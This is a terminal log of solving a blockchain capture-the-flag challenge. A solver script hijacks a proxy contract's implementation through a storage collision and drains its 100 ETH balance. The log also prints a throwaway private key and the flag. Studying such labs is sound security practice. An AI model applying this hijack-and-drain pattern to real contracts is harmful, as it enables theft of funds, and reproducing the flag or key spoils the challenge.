# solve
```bash
╰─ (*'-') < nc 10.83.2.136 31337                
1 - launch new instance
2 - kill instance
3 - get flag
action? 1
1
deploying setup

your private blockchain has been deployed
it will automatically terminate in 30 minutes
here's some useful information
uuid:           9ef41611-e2d3-44ca-a9c9-1d7d3b834cb8
rpc endpoint:   http://10.83.2.136:8545/9ef41611-e2d3-44ca-a9c9-1d7d3b834cb8
private key:    0x944b2fce628a5f915e230fb2e90022dbecaf15b2997fef4b06eb78776dcca408
your address:   0xbC45f4082D8081acBeCc5fEeaEa5c47591fc92D8
setup contract: 0x82692eacF3202eF01bCd8a236bB62B652E60972b


╭─ /Users/mionorn124/Downloads/blockchain-referral(pwn)
╰─ (*'-') < ls                          
Chal.sol  Proxy.sol Setup.sol
╭─ /Users/mionorn124/Downloads/blockchain-referral(pwn)
╰─ (*'-') < vim solver.py
╭─ /Users/mionorn124/Downloads/blockchain-referral(pwn)
╰─ (*'-') < python3 solver.py                    
2026-11-14 02:33:08,490 INFO Chain ID: 31337
2026-11-14 02:33:08,490 INFO Attacker: 0xbC45f4082D8081acBeCc5fEeaEa5c47591fc92D8
2026-11-14 02:33:10,702 INFO Target: 0x26C601CD2bD8913F579E331F9a2d1fc6F0ff74c4
2026-11-14 02:33:11,051 INFO Initial balance: 100 ETH
2026-11-14 02:33:13,510 INFO Original implementation: 0x52f7E72DFd2fE54C70d5861878A8E77c77b64815
2026-11-14 02:33:13,916 INFO [1/4] Compiling attack contract
2026-11-14 02:33:13,918 INFO Installing solc 0.8.20
2026-11-14 02:33:14,740 INFO Downloading from https://binaries.soliditylang.org/macosx-amd64/solc-macosx-amd64-v0.8.20+commit.a1b79de6
2026-11-14 02:33:20,010 INFO Using solc version 0.8.20
2026-11-14 02:33:20,010 INFO solc 0.8.20 successfully installed at: /Users/mionorn124/.solcx/solc-v0.8.20
2026-11-14 02:33:20,010 INFO Using solc version 0.8.20
2026-11-14 02:33:20,042 INFO [2/4] Deploying attack contract
2026-11-14 02:33:21,964 ERROR Exploit failed
Traceback (most recent call last):
  File "/Users/mionorn124/Downloads/blockchain-referral/solver.py", line 269, in <module>
    main()
  File "/Users/mionorn124/Downloads/blockchain-referral/solver.py", line 181, in main
    receipt = send(
  File "/Users/mionorn124/Downloads/blockchain-referral/solver.py", line 149, in send
    signed = account.sign_transaction(tx)
  File "/opt/anaconda3/envs/pwn/lib/python3.10/site-packages/eth_account/signers/local.py", line 134, in sign_transaction
    self._publicapi.sign_transaction(transaction_dict, self.key, blobs=blobs),
  File "/opt/anaconda3/envs/pwn/lib/python3.10/site-packages/eth_utils/decorators.py", line 28, in _wrapper
    return self.method(obj, *args, **kwargs)
  File "/opt/anaconda3/envs/pwn/lib/python3.10/site-packages/eth_account/account.py", line 863, in sign_transaction
    ) = sign_transaction_dict(account._key_obj, sanitized_transaction, blobs=blobs)
  File "/opt/anaconda3/envs/pwn/lib/python3.10/site-packages/eth_account/_utils/signing.py", line 54, in sign_transaction_dict
    transaction_hash = unsigned_transaction.hash()
  File "/opt/anaconda3/envs/pwn/lib/python3.10/site-packages/eth_account/typed_transactions/typed_transaction.py", line 156, in hash
    return self.transaction.hash()
  File "/opt/anaconda3/envs/pwn/lib/python3.10/site-packages/eth_account/typed_transactions/dynamic_fee_transaction.py", line 213, in hash
    rlp_serializer.from_dict(rlp_structured_txn_without_sig_fields),  # type: ignore  # noqa: E501
  File "/opt/anaconda3/envs/pwn/lib/python3.10/site-packages/eth_rlp/main.py", line 83, in from_dict
    return cls(**field_dict)
  File "/opt/anaconda3/envs/pwn/lib/python3.10/site-packages/rlp/sedes/serializable.py", line 191, in __init__
    field_values = merge_kwargs_to_args(args, kwargs, self._meta.field_names)
  File "/opt/anaconda3/envs/pwn/lib/python3.10/site-packages/eth_utils/functional.py", line 49, in inner
    return callback(fn(*args, **kwargs))
  File "/opt/anaconda3/envs/pwn/lib/python3.10/site-packages/rlp/sedes/serializable.py", line 60, in merge_kwargs_to_args
    validate_args_and_kwargs(args, kwargs, arg_names, allow_missing=allow_missing)
  File "/opt/anaconda3/envs/pwn/lib/python3.10/site-packages/rlp/sedes/serializable.py", line 51, in validate_args_and_kwargs
    raise TypeError(f"Unknown kwargs: {sorted(unknown_kwargs)}")
TypeError: Unknown kwargs: ['gasPrice']
╭─ /Users/mionorn124/Downloads/blockchain-referral(pwn)
╰─ (*'-') < rm -rf solver.py
╭─ /Users/mionorn124/Downloads/blockchain-referral(pwn)
╰─ (*'-') < vim solver.py
╭─ /Users/mionorn124/Downloads/blockchain-referral(pwn)
╰─ (*'-') < python3 solver.py
2026-11-14 02:34:30,020 INFO Chain ID: 31337
2026-11-14 02:34:30,021 INFO Attacker: 0xbC45f4082D8081acBeCc5fEeaEa5c47591fc92D8
2026-11-14 02:34:31,637 INFO Target: 0x26C601CD2bD8913F579E331F9a2d1fc6F0ff74c4
2026-11-14 02:34:31,638 INFO Initial balance: 100 ETH
2026-11-14 02:34:35,018 INFO Original implementation: 0x52f7E72DFd2fE54C70d5861878A8E77c77b64815
2026-11-14 02:34:35,429 INFO [1/4] Compiling attack contract
2026-11-14 02:34:35,430 INFO Using solc version 0.8.20
2026-11-14 02:34:35,487 INFO [2/4] Deploying attack contract
2026-11-14 02:34:39,927 INFO Deploy Attack TX: 04a74bf60ee737f6480cc84825277a88f8abe7835e4e64f17208024d1925d1d5
2026-11-14 02:34:40,245 INFO Deploy Attack success (gas used: 188087)
2026-11-14 02:34:40,246 INFO Attack deployed: 0xd053b4D9AFEBfB028d0AFBaB725Ed170B8D1dA9E
2026-11-14 02:34:40,246 INFO [3/4] Overwriting implementation
2026-11-14 02:34:42,287 INFO Storage Collision TX: 4014ef3be578c4d3c17cc43badd1cfcef3899f1e1830b8b17d9b67eb534e7d5b
2026-11-14 02:34:42,607 INFO Storage Collision success (gas used: 54854)
2026-11-14 02:34:44,056 INFO New implementation: 0xd053b4D9AFEBfB028d0AFBaB725Ed170B8D1dA9E
2026-11-14 02:34:44,056 INFO Implementation hijacked successfully
2026-11-14 02:34:44,056 INFO [4/4] Draining proxy
2026-11-14 02:34:44,439 INFO Proxy balance before drain: 100 ETH
2026-11-14 02:34:47,205 INFO Drain TX: d40ac542d3330adc294dfb398b0fcbd848c2d2902c5a767a75568403f670326c
2026-11-14 02:34:47,613 INFO Drain success (gas used: 33914)
2026-11-14 02:34:49,970 INFO Remaining balance: 0 wei
2026-11-14 02:34:49,970 INFO isSolved(): True

============================================================
[+] CHALLENGE SOLVED
[+] Storage collision successful
[+] Proxy implementation hijacked
[+] Proxy balance: 0 ETH
[+] isSolved(): true
============================================================

[+] Get flag:
    nc 10.83.2.136 31337
    Select option 3
╭─ /Users/mionorn124/Downloads/blockchain-referral(pwn)
╰─ (*'-') < nc 10.83.2.136 31337
1 - launch new instance
2 - kill instance
3 - get flag
action? 3
3
PP{st0r4g3_c0ll1s10n_r3f3rr4l::-MGWVanIDR_p}



╭─ /Users/mionorn124/Downloads/blockchain-referral(pwn)
╰─ (*'-') < 

```
